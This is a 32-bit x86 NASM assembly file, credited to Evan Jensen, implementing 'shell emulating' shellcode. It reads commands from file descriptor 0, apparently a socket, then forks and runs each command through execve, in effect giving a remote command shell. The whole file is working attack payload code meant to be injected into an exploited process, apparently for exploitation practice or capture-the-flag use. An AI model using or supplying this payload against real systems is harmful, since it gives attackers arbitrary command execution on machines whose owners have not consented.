	;; Evan Jensen 32bit shell emulating shellcode
	;; 
BITS 32
	%include "short32.s"
	%include "syscall.s"
	%define BUFFERLEN 0x1ff

	global main

main:
	
get_input:
	xor eax,eax
	cdq
	mov dx, BUFFERLEN
	mov ecx,esp
	xor ebx,ebx
	SYSTEM_CALL(read)
	mov ebp,eax
	test eax,eax
	
%ifdef PLAYFAIR
	jz short do_exit 	;test if socket is closed
%endif
	mov byte [esp+eax-1],0	
	

do_fork:
	
	SYSTEM_CALL(fork)
	test eax,eax
	jz short child
parent:
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx
	SYSTEM_CALL(waitpid)
	jmp short main

child:
	
	cld
	;let's parse the arguments here
	
%ifndef PLAYFAIR
	test ebp,ebp		;return of read
	jz short do_fork
%endif
	
parse:
	mov ecx, ebp
	push byte " "		
	pop eax			;space used for inlined strchr
	mov ebx,esp
	sub esp,edx		;space for argv[]
	cdq			;msb of eax is zero so this is ok
	
	
add_token: 	;; calculate the pointerp to push
	
	mov esi,ebp
	sub esi,ecx
 	
	lea edi,[ebx + esi] ;register subtraction no good in lea
	mov [esp+edx*4], edi ;save the current token
	inc edx		     ;increment argv[] index
	
	repne scasb		;find the next space
	
	mov esi,ebp
	sub esi,ecx
	mov byte[ebx+esi-1],0	;replace the space with null byte (strtok)
	
	test ecx,ecx		;if ECX is zero we've hit the end of the input str
	jz short exec		;set up for execve systemcall (with argv =D)
	jmp short add_token	;if not, strtok
	
exec:
	xchg ecx,eax		;eax=0
	mov [esp+edx*4],eax
	cdq
	mov al,execve
	lea ecx,[esp]
	SYSTEM_CALL
	
do_exit:;; exit nicely if anything fails
	xor ebx,ebx ;optional
	SYSTEM_CALL(exit)